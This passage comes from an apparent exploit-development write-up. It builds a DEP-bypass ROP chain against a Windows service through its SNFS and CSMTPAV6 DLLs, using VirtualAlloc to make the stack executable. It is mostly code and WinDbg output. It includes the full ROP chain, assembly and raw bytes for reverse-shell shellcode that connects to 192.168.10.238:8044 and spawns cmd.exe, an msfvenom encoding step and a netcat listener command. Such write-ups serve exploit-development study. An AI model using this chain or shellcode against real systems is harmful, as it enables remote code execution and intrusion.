rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

rop += pack("<L", (0x502162b5)) # push eax ; and al, 0x59 ; pop ecx ; ret  ; 

#EAX will need valid memory address for the next gadget so we just add the virtualloc address
rop += pack("<L", (0x5021376f)) # pop eax ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address

#restore eax from ebp
rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret

rop += pack("<L", (0x1001526c)) # mov dword [eax], ecx ; ret  ;
```

We check that everything is working as shown below.

```python
0:001> dds eax - 14 L6
00e9e2f0  100252e0 SNFS!_imp__VirtualAlloc
00e9e2f4  00e9e434
00e9e2f8  00e9e434
00e9e2fc  00000001
00e9e300  00001000
00e9e304  00000040
```

### Executing VirtualAlloc (#exvalloc)

With everything aligned and ready, the only challenge that remains is to invoke the API. We look for gadgets that allows us to overwrite ESP.

```python
gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(mov esp,).*?((retn  ;)|(ret  ;))"  | Select-String -Pattern "(leave)" -NotMatch  | Select-String -Pattern "(000)" -NotMatch

ROPS\SNFS.dll.txt:10857:0x1001a555: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:12420:0x1001a554: pop ebx ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:13334:0x1001a553: pop esi ; pop ebx ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5742:0x5100ac04: mov esp, ebp ; pop ebp ; push ecx ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5743:0x5100ace2: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5744:0x5100b5ae: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5745:0x5100b691: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5746:0x5100c4c1: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5747:0x5100c550: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5748:0x5100e459: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5749:0x5100e427: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:5750:0x5100fd9c: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
```

We seem to only find a gadget that writes `EBP` to the `ESP` address. Luckily for us we’ve been using `EBP` regulary within our ROP chain. Let’s recap our register values etc. at the end of the ROP chain.

```python
0:001> r
eax=00e9e304 ebx=42424242 ecx=00000040 edx=db61fb30 esi=42424242 edi=42424242
eip=1001526e esp=00e9e470 ebp=00e9e304 iopl=0         ov up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a86
SNFS!_dosmaperr+0x48:
1001526e c3              ret

0:001> dds eax - 14 L6
00e9e2f0  100252e0 SNFS!_imp__VirtualAlloc
00e9e2f4  00e9e434
00e9e2f8  00e9e434
00e9e2fc  00000001
00e9e300  00001000
00e9e304  00000040
```

When our ROP chain completes `EBP` and `EAX` contains the stack address of the last argument e.g. `flProtect`. We need to adjust address to point to our `VirtualAlloc` address. We will do so using arithmetic, although small values will contain null-bytes, any bits higher than 32 will be discarded. So we add a large value to align the address. We mostly re-use some of our previous gadgets. We see that we would want to use `ffffffec` e.g. 20 bytes for our offset. We notice that our `POP EBP` will increase the stack by `4 bytes`. Therefore we want to land `4 bytes` before our `20 bytes` e.g. `24 bytes`.

```python
017be2f0  100252e0 SNFS!_imp__VirtualAlloc
017be2f4  017be434
017be2f8  017be434
017be2fc  00000001
017be300  00001000
017be304  00000040
017be308  017be30c

0:006> ? 017be304 - 017be2f0
Evaluate expression: 20 = 00000014
0:006> .formats 00000014
Evaluate expression:
  Hex:     00000014
  Decimal: 20
  Octal:   00000000024
  Binary:  00000000 00000000 00000000 00010100
  Chars:   ....
  Time:    Wed Dec 31 16:00:20 1969
  Float:   low 2.8026e-044 high 0
  Double:  9.88131e-323

#add four bytes

0:001> .formats -00000018
Evaluate expression:
  Hex:     ffffffe8
  Decimal: -24
  Octal:   37777777750
  Binary:  11111111 11111111 11111111 11101000
  Chars:   ....
  Time:    ***** Invalid
  Float:   low -1.#QNAN high -1.#QNAN
  Double:  -1.#QNAN

rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0xffffffec)) # negative offset value start at 

rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;

rop += pack("<L", (0x1001a555)) # mov esp, ebp ; pop ebp ; ret  ;
```

We check that everything works before we continue and to ensure that we successfully reach just short of our `VirtualAlloc` as intended.

```python
0:006> dds ebp L8
018fe2ec  41414141
018fe2f0  100252e0 SNFS!_imp__VirtualAlloc
018fe2f4  018fe434
018fe2f8  018fe434
018fe2fc  00000001
018fe300  00001000
018fe304  00000040
018fe308  018fe30c
0:006> p
eax=018fe2ec ebx=42424242 ecx=ffffffe8 edx=db61fb30 esi=42424242 edi=42424242
eip=1001a557 esp=018fe2ec ebp=018fe2ec iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
SNFS!_except_handler3+0xbb:
1001a557 5d              pop     ebp
0:006> dds esp L12
018fe2ec  41414141
018fe2f0  100252e0 SNFS!_imp__VirtualAlloc
018fe2f4  018fe434
018fe2f8  018fe434
018fe2fc  00000001
018fe300  00001000
018fe304  00000040
```

We keep stepping through our final instructions and finally note that we arrive at `KERNEL32!VirtualAllocStub`, and that our memory area has been successfully patched from `PAGE_READWRITE` to `PAGE_EXECUTE_READWRITE`.

```python
0:001> p
eax=00eae2ec ebx=42424242 ecx=ffffffe8 edx=db2934c0 esi=42424242 edi=42424242
eip=1001a558 esp=00eae2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
SNFS!_except_handler3+0xbc:
1001a558 c3              ret
0:001> dds esp L1
00eae2f0  76ca4d30 KERNEL32!VirtualAllocStub
0:001> !vprot 76ca4d30 
BaseAddress:       76ca4000
AllocationBase:    76c80000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00063000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
0:001> p
eax=00eae2ec ebx=42424242 ecx=ffffffe8 edx=db2934c0 esi=42424242 edi=42424242
eip=76ca4d30 esp=00eae2f4 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
KERNEL32!VirtualAllocStub:
76ca4d30 8bff            mov     edi,edi
0:001> dds esp L1
00eae2f4  00eae434
0:001> !vprot 00eae434
BaseAddress:       00eae000
AllocationBase:    00e10000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00062000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
0:001> pt
eax=00eae000 ebx=42424242 ecx=00eae2c4 edx=770313a0 esi=42424242 edi=42424242
eip=75084c61 esp=00eae2f4 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x51:
75084c61 c21000          ret     10h
0:001> !vprot 00eae434
BaseAddress:       00eae000
AllocationBase:    00e10000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE

```

For us to continue to adding our shellcode, we need to align our shellcode with our return address. Instead of modifying the offsets we used, we will insert padding bytes before the shellcode. We use the following technique to obtain the required padding bytes.

```
#increase EAX 0x20 x 14 
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx

rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
rop += pack("<L", (0x10011521)) # +--    NFS.dll.txt:3743:0x10011521: add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop ebx
```

 We return out of `VirtualAlloc` and obtain the address of the first instructions. We dump the contents of the stack and obtain the address where our ROP chain ends.  We then calculate the difference between the two.

1. We return out of `VirtualAlloc` and obtain the address of the first instruction `0193e4b4`.
    
    ```python
    0:006> p
    eax=0193e2ec ebx=42424242 ecx=ffffffe8 edx=db2934c0 esi=42424242 edi=42424242
    eip=76ca4d30 esp=0193e2f4 ebp=41414141 iopl=0         nv up ei pl nz na po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
    KERNEL32!VirtualAllocStub:
    76ca4d30 8bff            mov     edi,edi
    0:006> dds esp L1
    0193e2f4  0193e4b4
    ```
    
2. We dump the contents of the stack and obtain the address where the ROP chain ends `0193e4b4`
    
    ```python
    0:006> dds esp + 180
    0193e474  80808080
    0193e478  10022a64 SNFS!std::basic_string<char,std::char_traits<char>,std::allocator<char> >::compare+0xa3
    0193e47c  7f7f7fc0
    0193e480  10012ef4 SNFS!_DestructExceptionObject+0x86
    0193e484  42424242
    0193e488  00000040
    0193e48c  5021376f CSNCDAV6!EncodeFileW+0x9617
    0193e490  100252e0 SNFS!_imp__VirtualAlloc
    0193e494  0193e304
    0193e498  1001526c SNFS!_dosmaperr+0x46
    0193e49c  10022a64 SNFS!std::basic_string<char,std::char_traits<char>,std::allocator<char> >::compare+0xa3
    0193e4a0  ffffffe8
    0193e4a4  10012ef4 SNFS!_DestructExceptionObject+0x86
    0193e4a8  42424242
    0193e4ac  0193e2ec
    0193e4b0  1001a555 SNFS!_except_handler3+0xb9
    0193e4b4  cccccccc
    0193e4b8  cccccccc
    ```
    
3. We notice no difference between the two and we are lucky enough to land exactly on our shellcode location.
    
    ```python
    0:006> ? 0193e4b4 - 0193e4b4
    Evaluate expression: 0 = 00000000
    ```
    

We step through our instructions and we can confirm that our shellcode are executed. Now to add a real payload!

```python
0:006> ? 0193e4b4 - 0193e4b4
Evaluate expression: 0 = 00000000
0:006> pt
eax=0193e000 ebx=42424242 ecx=0193e2c4 edx=770313a0 esi=42424242 edi=42424242
eip=75084c61 esp=0193e2f4 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x51:
75084c61 c21000          ret     10h
0:006> p
eax=0193e000 ebx=42424242 ecx=0193e2c4 edx=770313a0 esi=42424242 edi=42424242
eip=0193e4b4 esp=0193e308 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0193e4b4 cc              int     3
```

### Running Shellcode (#shellexec)

Once completed, we replace our dummy shellcode with some actual shellcode that will execute a payload to obtain a reverse shell.

Let’s identify how much space we have.  When `VirtualAlloc` completes we return to our dummy shellcode, we can dump memory at `EIP` to find the exact amount.

```python
0:077> dd eip L70
01a1e4b4  cccccccc cccccccc cccccccc cccccccc
01a1e4c4  cccccccc cccccccc cccccccc cccccccc
01a1e4d4  cccccccc cccccccc cccccccc cccccccc
01a1e4e4  cccccccc cccccccc cccccccc cccccccc
01a1e4f4  cccccccc cccccccc cccccccc cccccccc
01a1e504  cccccccc cccccccc cccccccc cccccccc
01a1e514  cccccccc cccccccc cccccccc cccccccc
01a1e524  cccccccc cccccccc cccccccc cccccccc
01a1e534  cccccccc cccccccc cccccccc cccccccc
01a1e544  cccccccc cccccccc cccccccc cccccccc
01a1e554  cccccccc cccccccc cccccccc cccccccc
01a1e564  cccccccc cccccccc cccccccc cccccccc
01a1e574  cccccccc cccccccc cccccccc cccccccc
01a1e584  cccccccc cccccccc cccccccc cccccccc
01a1e594  cccccccc cccccccc cccccccc cccccccc
01a1e5a4  cccccccc cccccccc cccccccc cccccccc
01a1e5b4  cccccccc cccccccc cccccccc cccccccc
01a1e5c4  cccccccc cccccccc cccccccc cccccccc
01a1e5d4  cccccccc cccccccc cccccccc cccccccc
01a1e5e4  cccccccc cccccccc cccccccc cccccccc
01a1e5f4  00000000 00000000 00000000 00000000

0:077> ? 01a1e5e4 - eip
Evaluate expression: 304 = 00000130
```

We only seem to have `304` bytes available, we testing if we can increase the buffer or we need to use custom shellcode. We increase our shellcode buffer from `0x400` to `0x600`.

```python
rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;

rop += pack("<L", (0x1001a555)) # mov esp, ebp ; pop ebp ; ret  ;

shellcode = b"\xcc" * (0x600 - 276 - 4 - len(rop))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset + va + eip + rop + shellcode ,0,0,0,0)
buf += formatString
```

Not good, it seems we have an access violation and would need custom shellcode. 

![Untitled](/assets/Untitled%204.png)

By trail and error we manage to note we can increase our payload to only `0x480` which works successfully. This leaves us with `444 bytes` of shellcode space.

```python
0:006> ? 0193e670 - eip
Evaluate expression: 444 = 000001bc
```

We utilise the [shellcoder.py](http://shellcoder.py) script created by #EPI502. 

```python
┌──(zorx㉿argon)-[~]
└─$ python3 shellcoder.py -l 192.168.10.238 -p 8044 --store-shellcode                                                                  
   start:                               
            
       mov ebp, esp                    ;
       add esp, 0xfffff9f0             ;
   find_kernel32:                       
       xor ecx,ecx                     ;
       mov esi,fs:[ecx+30h]            ;
       mov esi,[esi+0Ch]               ;
       mov esi,[esi+1Ch]               ;
   next_module:                         
       mov ebx, [esi+8h]               ;
       mov edi, [esi+20h]              ;
       mov esi, [esi]                  ;
       cmp [edi+12*2], cx              ;
       jne next_module                 ;
   find_function_shorten:               
       jmp find_function_shorten_bnc   ;
   find_function_ret:                   
       pop esi                         ;
       mov [ebp+0x04], esi             ;
       jmp resolve_symbols_kernel32    ;
   find_function_shorten_bnc:           
       call find_function_ret          ;
   find_function:                       
       pushad                          ;
       mov eax, [ebx+0x3c]             ;
       mov edi, [ebx+eax+0x78]         ;
       add edi, ebx                    ;
       mov ecx, [edi+0x18]             ;
       mov eax, [edi+0x20]             ;
       add eax, ebx                    ;
       mov [ebp-4], eax                ;
   find_function_loop:                  
       jecxz find_function_finished    ;
       dec ecx                         ;
       mov eax, [ebp-4]                ;
       mov esi, [eax+ecx*4]            ;
       add esi, ebx                    ;
   compute_hash:                        
       xor eax, eax                    ;
       cdq                             ;
       cld                             ;
   compute_hash_again:                  
       lodsb                           ;
       test al, al                     ;
       jz compute_hash_finished        ;
       ror edx, 0x0d                   ;
       add edx, eax                    ;
       jmp compute_hash_again          ;
   compute_hash_finished:               
   find_function_compare:               
       cmp edx, [esp+0x24]             ;
       jnz find_function_loop          ;
       mov edx, [edi+0x24]             ;
       add edx, ebx                    ;
       mov cx, [edx+2*ecx]             ;
       mov edx, [edi+0x1c]             ;
       add edx, ebx                    ;
       mov eax, [edx+4*ecx]            ;
       add eax, ebx                    ;
       mov [esp+0x1c], eax             ;
   find_function_finished:              
       popad                           ;
       ret                             ;
   resolve_symbols_kernel32:            
push 0x78b5b983
       call dword ptr [ebp+0x04]       ;
       mov [ebp+0x10], eax             ;
push 0xec0e4e8e
       call dword ptr [ebp+0x04]       ;
       mov [ebp+0x14], eax             ;
push 0x16b3fe72
       call dword ptr [ebp+0x04]       ;
       mov [ebp+0x18], eax             ;
   load_ws2_32:                         
       xor eax, eax                    ;
       mov ax, 0x6c6c                  ;
       push eax                        ;
       push 0x642e3233                 ;
       push 0x5f327377                 ;
       push esp                        ;
       call dword ptr [ebp+0x14]       ;
   resolve_symbols_ws2_32:              
       mov ebx, eax                    ;
push 0x3bfcedcb
       call dword ptr [ebp+0x04]       ;
       mov [ebp+0x1C], eax             ;
push 0xadf509d9
       call dword ptr [ebp+0x04]       ;
       mov [ebp+0x20], eax             ;
push 0xb32dba0c
       call dword ptr [ebp+0x04]       ;
       mov [ebp+0x24], eax             ;
   call_wsastartup:                    ;
       mov eax, esp                    ;
       xor ecx, ecx                    ;
       mov cx, 0x590                   ;
       sub eax, ecx                    ;
       push eax                        ;
       xor eax, eax                    ;
       mov ax, 0x0202                  ;
       push eax                        ;
       call dword ptr [ebp+0x1C]       ;
   call_wsasocketa:                     
       xor eax, eax                    ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       mov al, 0x06                    ;
       push eax                        ;
       sub al, 0x05                    ;
       push eax                        ;
       inc eax                         ;
       push eax                        ;
       call dword ptr [ebp+0x20]       ;
   call_wsaconnect:                     
       mov esi, eax                    ;
       xor eax, eax                    ;
       push eax                        ;
       push eax                        ;
      push 0xee0aa8c0   ;
      mov ax, 0x6c1f ;
       shl eax, 0x10                   ;
       add ax, 0x02                    ;
       push eax                        ;
       push esp                        ;
       pop edi                         ;
       xor eax, eax                    ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       add al, 0x10                    ;
       push eax                        ;
       push edi                        ;
       push esi                        ;
       call dword ptr [ebp+0x24]       ;
   create_startupinfoa:                 
       push esi                        ;
       push esi                        ;
       push esi                        ;
       xor eax, eax                    ;
       push eax                        ;
       push eax                        ;
       mov al, 0x80                    ;
       xor ecx, ecx                    ;
       mov cl, 0x80                    ;
       add eax, ecx                    ;
       push eax                        ;
       xor eax, eax                    ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       mov al, 0x44                    ;
       push eax                        ;
       push esp                        ;
       pop edi                         ;
   create_cmd_string:                   
       mov eax, 0xff9a879b             ;
       neg eax                         ;
       push eax                        ;
       push 0x2e646d63                 ;
       push esp                        ;
       pop ebx                         ;
   call_createprocessa:                 
       mov eax, esp                    ;
       xor ecx, ecx                    ;
       mov cx, 0x390                   ;
       sub eax, ecx                    ;
       push eax                        ;
       push edi                        ;
       xor eax, eax                    ;
       push eax                        ;
       push eax                        ;
       push eax                        ;
       inc eax                         ;
       push eax                        ;
       dec eax                         ;
       push eax                        ;
       push eax                        ;
       push ebx                        ;
       push eax                        ;
       call dword ptr [ebp+0x18]       ;
   exec_shellcode:                      
       xor ecx, ecx                    ;
       push ecx                        ;
       push 0xffffffff                 ;
       call dword ptr [ebp+0x10]       ;
[+] shellcode created!
[=]   len:   374 bytes
[=]   lhost: 192.168.10.238
[=]   lport: 8044
[=]   break: breakpoint disabled
[=]   ver:   pure reverse sehll
[=]   Shellcode stored in: shellcode.bin
[=]   help:
         Start listener:
                 nc -lnvp 8044
         Remove bad chars with msfvenom (use --store-shellcode flag): 
                 cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python -v shellcode

shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x31\xc9\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x0a\xee\x66\xb8\x1f\x6c\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\xb1\x80\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
```

We remove all bad characters as shown below and check the final size of our payload is under the `444 bytes` that we have left.

```python
┌──(zorx㉿argon)-[~]
└─$ cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x0b\x0c\x09\x20" -f python -v shellcode

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 401 (iteration=0)
x86/shikata_ga_nai chosen with final size 401
Payload size: 401 bytes
Final size of python file: 2250 bytes
shellcode =  b""
shellcode += b"\xba\x5d\x46\x9e\x1d\xdb\xd6\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x5e\x31\x56\x14\x83\xc6\x04"
shellcode += b"\x03\x56\x10\xbf\xb3\x17\xf8\xbe\xf8\xd8\xfa"
shellcode += b"\x3f\xff\x28\x34\xdb\x8b\x3a\xf6\xa8\xfa\xb0"
shellcode += b"\x7d\xd8\x1e\x42\xdf\x2c\x94\x2a\xc0\xa7\x9c"
shellcode += b"\xb4\x39\xf8\xf8\x4d\xc8\xed\xff\xf3\xa5\x84"
shellcode += b"\xfb\xe0\xe2\x8e\xf1\x08\xf5\xb1\x9a\x7d\x49"
shellcode += b"\x71\xd0\xfe\x4d\xf1\xe7\x21\xda\x4e\xf0\x56"
shellcode += b"\x9a\x70\x01\xb1\xac\x35\xfd\xa2\x99\xfc\x76"
shellcode += b"\x61\x1a\x75\xbc\xe2\xe3\x57\x8c\x32\x7a\x9b"
shellcode += b"\x43\x36\xbd\x17\x9b\xf6\xf4\xda\xa2\x3a\xe3"
shellcode += b"\x10\x9f\xee\xd0\xfc\x95\xd1\x92\xab\x71\xef"
shellcode += b"\x7e\x35\xf1\xe3\x34\x32\x52\xe0\xc9\x9e\xd6"
shellcode += b"\x1c\x40\x1f\x31\x95\x10\x3b\xdd\xc7\x5b\x2b"
shellcode += b"\x5e\xbe\xe9\xd3\x9f\x94\x15\xaa\x25\x07\x7e"
shellcode += b"\x22\xeb\x29\x92\xc5\xa1\x31\xe3\x7c\x5e\x52"
shellcode += b"\x81\x80\xed\xb4\x9a\x29\x16\x30\x21\xc9\x27"
shellcode += b"\x82\xcc\x51\x2b\x6e\x41\xc9\x87\x5c\x4f\x6d"
shellcode += b"\x80\xd7\xfc\x5f\x0f\x4c\xfc\xca\xbb\xe5\xc1"
shellcode += b"\x9c\x08\x18\x39\x67\x70\xb6\xc6\x1e\xcb\x25"
shellcode += b"\xaf\xf9\xdd\xa0\x82\x06\x88\x4e\x54\xbd\x13"
shellcode += b"\x27\x6a\x87\x79\x04\x8d\xa2\x85\xe3\x37\x68"
shellcode += b"\x0f\x13\x86\xb9\x69\x6d\x79\x3c\x5f\x45\x2a"
shellcode += b"\x0f\x5f\x33\x73\x6d\x5d\xec\x7c\x24\x7d\x3d"
shellcode += b"\x43\x96\x2d\x6d\xf3\x10\x9e\xa1\xf6\x4c\x5e"
shellcode += b"\xea\x07\x39\x7e\x83\x3e\xf0\xbe\xc3\xee\x9a"
shellcode += b"\xfe\x4c\x04\xb4\x99\x34\x06\x24\xa7\xa5\x29"
shellcode += b"\xd2\xa4\xe6\x48\x4a\xff\xb9\x7d\xaa\xaf\x15"
shellcode += b"\x2e\x7a\x54\x86\x9e\x2d\x02\x59\x4b\xf5\xfc"
shellcode += b"\xf3\x22\xc4\xc0\xac\x9a\x96\x41\x7d\xd2\x67"
shellcode += b"\xc1\x7f\x2c\xd7\xf3\xbf\xfc\x87\xa3\x6f\xad"
shellcode += b"\x77\x14\xc0\x1d\x27\x24\xa4\xcd\x93\x1b\x9d"
shellcode += b"\x75\x9c\x3e\x22\x7e\x7a\x6e\xb5\xe2\x17\xeb"
shellcode += b"\x6b\xb1\xbc\x7a\x93\x08\x8b\x1b\xed\xfb\x08"
shellcode += b"\xcd\xc5\xac\x59\x3c\x16\x1c\x35\x6e\xd6\xcd"
shellcode += b"\xfd\xde\x86\xbe\xad\x21\x73\x59\x7c\x17\x2d"
shellcode += b"\x33\x81\x58\x9b\xd3"
```

We run our payload and successfully obtain a reverse shell. In the next write-up we’ll focus on creating custom shellcode much smaller than the one we currently utilise.

![Untitled](/assets/Untitled%205.png)

Our full ROP chain looks as follows, use dropdown to view.
<details>
  <summary>Large Code Block</summary>
  
 
  
```python
eip = pack("<L", (0x100113dd)) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;

#bad chars:  0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20

##OBTAINING VIRTUALALLOC ADDRESS
rop = pack("<L", (0x10012394)) # mov eax, ebx ; pop esi ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop esi
rop += pack("<L", (0x42424242)) # pop ebx 

rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;  (1 found)
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address
rop += pack("<L", (0x5021db6c)) #  xor edx, edx ; ret  ;  (1 found)
rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret  
rop += pack("<L", (0x10021d7c)) # mov dword [eax], edx ; ret  ;

####PATCH RETURN ADDRESS
### Patching Return Address by 4 bytes
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
rop += pack("<L", (0x10011b04)) # inc eax ; ret  ;  
